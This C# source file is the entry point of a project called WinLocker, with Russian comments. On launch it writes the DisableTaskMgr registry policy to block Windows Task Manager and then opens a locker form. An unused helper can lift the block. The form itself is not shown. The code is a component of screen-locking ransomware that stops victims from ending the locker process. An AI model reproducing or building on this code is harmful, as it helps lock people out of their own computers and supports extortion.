using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinLocker
{
    internal static class Program
    {
        [STAThread]
        static void Main()
    {
        // Блокируем Диспетчер задач
        DisableTaskManager();

        // Запуск основной формы приложения
        Application.Run(new winlocker());
    }

    static void DisableTaskManager()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();
        }
        catch (Exception e)
        {
            Console.WriteLine($"Ошибка при блокировке диспетчера задач: {e.Message}");
        }
    }

    static void EnableTaskManager()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.DeleteValue("DisableTaskMgr", false);
            key.Close();
        }
        catch (Exception e)
        {
            Console.WriteLine($"Ошибка при разблокировке диспетчера задач: {e.Message}");
        }
    }
    }
}
